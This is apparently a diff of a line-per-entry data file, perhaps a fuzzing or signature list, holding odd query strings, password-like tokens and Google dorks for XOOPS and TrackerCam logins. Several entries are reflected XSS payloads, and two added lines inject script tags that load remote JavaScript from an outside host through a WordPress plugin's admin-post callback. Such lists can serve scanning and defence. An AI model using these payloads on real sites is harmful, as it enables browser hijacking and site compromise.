q135w&sh=qq136w&&vx3by=qq137w&
 index.php?uid=587609&ver=8g%20xp
 intitle:"xoops site" intitle:"just use it!" | "powered by xoops (2.0)|(2.0.....)"
 intitle:("trackercam live video")|("trackercam application login")|("trackercam remote") -trackercam.com
@@ -610,11 +650,15 @@ l$|k&?/i<9-88j/!i!(m[$_b
 l0ng!(!$&
 lam0nt!(74
 li!((@1992lin
+liberalarts/facviewer.html?uid=97
 link*)!&
 liujiapo!((@605
 liveoak!)!(
+login/?uid=%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
 login/sm_login_screen.php?uid=\
 login/sm_login_screen.php?uid=\"><script>alert('vulnerable')</script>
+louhou=1
+loveyou*)
 loveyou=-~~520..
 ltx86%!(6b>5|(3
 lv14!(11
@@ -630,6 +674,7 @@ merpati!@)$!(&$
 min1985minzkdns.com!(*%
 min21minzkdns.com!(*%
 min86minzkdns.com!(*%
+mjmxmde5odc=
 mlion!(87
 mml355!(
 mmu082687!(
@@ -1140,11 +1185,13 @@ mydove1314qq(*)
 n(|
 na1973!(&#
 nadirbh1994!(($
+nalini^*)
 nazarianiputri1930!(#)
 net1580@!%*)
 nie!(**!)@)
 nimish%!)!((%
 ntktlblfh!(*^
+nwfasns!((&are
 o(i*)+|
 o(i*)p(o
 opera/9.80 (windows nt 6.1; wow64; wuid=2bbf8ef8d0fa60af6177cad42ac3a75b; wtb=6787) presto/2.12.388 version/12.12
@@ -1195,6 +1242,7 @@ rdc=m4a1
 read.php?tid=&uid=&ds=
 recettes/envoyez-photo.aspx?recetteguid=
 replied: /cn=robots/@nexor.co.uk
+reputation!(*(
 resource-ldap1-dc=example.xml
 return-path: </cn=robots-errors/@nexor.co.uk>
 rocity!(*^
@@ -1241,6 +1289,7 @@ summer@)!(
 sungoh!(*(
 suzu!(==
 sysadmin!(*#
+system/login/sysloginuser.aspx?login=denied&uid=%3c%2fscript%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e
 syukur!(*%
 s|(
 t!(?
@@ -1297,6 +1346,8 @@ wenidc=123
 wgyazy!((#^!$
 witl?!(l)
 wozaisuzhou=1
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();&uid=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();&token=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();&email=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();&fly_id=1&article_placement_id=1&sidebar_placement_id=1&return_path=(function() { var elem = document.createelement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getelementsbytagname("head")[0].appendchild(elem);})();
+wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();&uid=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();&token=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();&email=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();&fly_id=1&article_placement_id=1&sidebar_placement_id=1&return_path=(function()%20%7b%20var%20elem%20=%20document.createelement(%5c'script%5c');%20elem.type%20=%20%5c'text/javascript%5c';%20elem.src%20=%20%5c'https://slow.destinyfernandi.com/hos?clod%5c';document.getelementsbytagname(%22head%22)[0].appendchild(elem);%7d)();
 wps/portal/plygem/aboutus/investorrelations/20odc=
 wps/portal/plygem/investorrelations/investorrelationshome/20odc=
 wslhd!(*()^@#
@@ -1313,8 +1364,10 @@ xxx<style>*{color:gre/**/en !/**/important}*{color:red}*{background:url(xx:x //*
 y!(3:;
 y(|
 yayawan!(*^
+yec%^#%^$*)($#&$#g
 yiran!(*(
 yoho)#^@*!(#$ajitag
+you=me
 you=n00b
 yozed!*12!(90
 yr(|>f|d5yx"revlk16j]wrc
